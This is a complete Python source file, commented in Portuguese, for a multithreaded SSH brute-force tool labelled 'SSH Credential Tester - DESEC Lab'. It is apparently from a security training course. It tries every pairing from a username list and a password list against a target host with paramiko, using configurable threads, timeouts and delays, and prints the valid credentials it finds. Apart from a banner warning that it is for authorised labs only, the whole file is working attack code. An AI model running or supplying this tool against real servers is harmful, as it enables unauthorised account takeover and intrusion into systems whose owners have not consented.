#!/usr/bin/env python3
"""
SSH Credential Tester - DESEC Lab (Multithreaded)
Uso: python3 ssh_brute.py <lista_usuarios> <lista_senhas> <IP_alvo> [opcoes]

AVISO: Use apenas em ambientes de laboratorio autorizados.
"""

import argparse
import paramiko
import socket
import sys
import time
import logging
import threading
from queue import Queue, Empty
from itertools import product

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

BANNER = f"""
{CYAN}{BOLD}
╔══════════════════════════════════════════════════╗
║    SSH Credential Tester - DESEC Lab             ║
║    Modo  : Multithreaded                         ║
║    Aviso : Uso em ambientes autorizados apenas   ║
╚══════════════════════════════════════════════════╝
{RESET}"""

# ── Primitivos de sincronizacao ────────────────────────────────────────────────
# print_lock  : garante que apenas 1 thread por vez escreve no terminal.
# stop_event  : quando setado (stop_event.set()), todas as threads param.
print_lock = threading.Lock()
stop_event = threading.Event()


class Contadores:
    """Os contadores estão compartilhados entre threads e são protegidos por Lock."""

    def __init__(self):
        self._lock     = threading.Lock()
        self.tentativas  = 0
        self.encontradas = []

    def incrementar(self):
        with self._lock:
            self.tentativas += 1
            return self.tentativas

    def adicionar(self, cred: str):
        with self._lock:
            self.encontradas.append(cred)


# ── Utilitarios ────────────────────────────────────────────────────────────

def carregar_lista(caminho: str) -> list:
    try:
        with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
            itens = [l.strip() for l in f if l.strip()]
        if not itens:
            print(f"{RED}[!] Arquivo vazio: {caminho}{RESET}")
            sys.exit(1)
        return itens
    except FileNotFoundError:
        print(f"{RED}[!] Arquivo nao encontrado: {caminho}{RESET}")
        sys.exit(1)


def tentar_credencial(host: str, port: int, usuario: str, senha: str, timeout: float):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=usuario,
            password=senha,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
            disabled_algorithms={"pubkeys": ["rsa-sha2-256", "rsa-sha2-512"]},
        )
        return True, "Credencial valida encontrada!"

    except paramiko.AuthenticationException:
        return False, "Falha de autenticacao"
    except paramiko.SSHException as e:
        return False, f"Erro SSH: {e}"
    except (socket.timeout, TimeoutError):
        return False, "Timeout"
    except ConnectionRefusedError:
        return False, "Conexao recusada"
    except OSError as e:
        return False, f"Erro de rede: {e}"
    finally:
        client.close()


# ── Worker (cada thread executa ele) ────────────────────────────────────────

def worker(
    fila: Queue,
    host: str,
    port: int,
    timeout: float,
    delay: float,
    verbose: bool,
    parar_no_primeiro: bool,
    contadores: Contadores,
    total: int,
):
    """
    Cada thread executa este loop:
      1. Retira um par (usuario, senha) da fila.
      2. Testa a credencial.
      3. Reporta resultado com print_lock (output limpo).
      4. Se --stop e achou válida, aciona stop_event para todas pararem.
      5. Repete até a fila esvaziar ou stop_event ser acionado.

    fila.get(timeout=0.5): espera ate 0.5s por um item. Se não vier,
    verifica stop_event e tenta de novo, assim evita thread travada.
    """
    while not stop_event.is_set():
        try:
            usuario, senha = fila.get(timeout=0.5)
        except Empty:
            # Fila vazia: encerra a thread normalmente
            break

        n = contadores.incrementar()

        if verbose:
            with print_lock:
                print(f"{YELLOW}[{n}/{total}] Testando  {usuario}:{senha}{RESET}",
                      end="\r", flush=True)

        sucesso, msg = tentar_credencial(host, port, usuario, senha, timeout)

        if sucesso:
            cred = f"{usuario}:{senha}"
            contadores.adicionar(cred)
            with print_lock:
                print(f"\n{GREEN}{BOLD}[+] {msg}  {cred}{RESET}", flush=True)
            if parar_no_primeiro:
                stop_event.set()   # sinaliza todas as outras threads pararem

        elif "Timeout" in msg or "recusada" in msg or "rede" in msg:
            with print_lock:
                print(f"\n{RED}[-] {msg} ({usuario}:{senha}){RESET}", flush=True)

        if delay > 0:
            time.sleep(delay)

        fila.task_done()


# Main 

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="SSH Credential Tester Multithreaded - DESEC Lab.",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("usuarios",
                        help="Arquivo com lista de usuarios (um por linha)")
    parser.add_argument("senhas",
                        help="Arquivo com lista de senhas  (uma por linha)")
    parser.add_argument("alvo",
                        help="IP ou hostname alvo")
    parser.add_argument("--port",    type=int,   default=22,
                        help="Porta SSH (padrao: 22)")
    parser.add_argument("--timeout", type=float, default=5.0,
                        help="Timeout por tentativa em segundos (padrao: 5)")
    parser.add_argument("--delay",   type=float, default=0.0,
                        help="Delay entre tentativas por thread, em segundos (padrao: 0)")
    parser.add_argument("--threads", type=int,   default=10,
                        help="Numero de threads paralelas (padrao: 10)")
    parser.add_argument("--verbose", action="store_true",
                        help="Exibe cada tentativa na tela")
    parser.add_argument("--stop",    action="store_true",
                        help="Para ao encontrar a primeira credencial valida")
    args = parser.parse_args()

    usuarios = carregar_lista(args.usuarios)
    senhas   = carregar_lista(args.senhas)
    total    = len(usuarios) * len(senhas)

    print(f"{CYAN}[*] Alvo     : {args.alvo}:{args.port}{RESET}")
    print(f"{CYAN}[*] Usuarios : {len(usuarios)} | Senhas: {len(senhas)} | Combinacoes: {total}{RESET}")
    print(f"{CYAN}[*] Threads  : {args.threads} | Timeout: {args.timeout}s | Delay: {args.delay}s{RESET}\n")

    # Carrega TODAS as combinações na fila antes de disparar as threads.
    # Queue e thread-safe nativamente. Vários producers/consumers sem Lock adicional.
    fila = Queue()
    for par in product(usuarios, senhas):
        fila.put(par)

    contadores = Contadores()
    inicio     = time.time()
    threads    = []

    try:
        # Dispara as N threads
        for _ in range(args.threads):
            t = threading.Thread(
                target=worker,
                args=(
                    fila, args.alvo, args.port, args.timeout,
                    args.delay, args.verbose, args.stop,
                    contadores, total,
                ),
                daemon=True,   # termina junto com o processo principal
            )
            t.start()
            threads.append(t)

        # Bloco principal aguarda todas as threads
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{YELLOW}[!] Interrompido. Aguardando threads finalizarem...{RESET}")
        for t in threads:
            t.join(timeout=3)

    elapsed = time.time() - inicio

    # ── Relatorio final ─────────────────────────────────────────────
    print(f"\n{'='*52}")
    print(f"{CYAN}[*] Tentativas : {contadores.tentativas}/{total}{RESET}")
    print(f"{CYAN}[*] Tempo total : {elapsed:.2f}s{RESET}")
    if elapsed > 0 and contadores.tentativas > 0:
        print(f"{CYAN}[*] Velocidade  : {contadores.tentativas / elapsed:.1f} tentativas/s{RESET}")

    if contadores.encontradas:
        print(f"\n{GREEN}{BOLD}[+] Credenciais validas ({len(contadores.encontradas)}):{RESET}")
        for cred in contadores.encontradas:
            print(f"    {GREEN}=>  {cred}{RESET}")
    else:
        print(f"{RED}[-] Nenhuma credencial valida encontrada.{RESET}")

    print(f"{'='*52}\n")


if __name__ == "__main__":
    main()
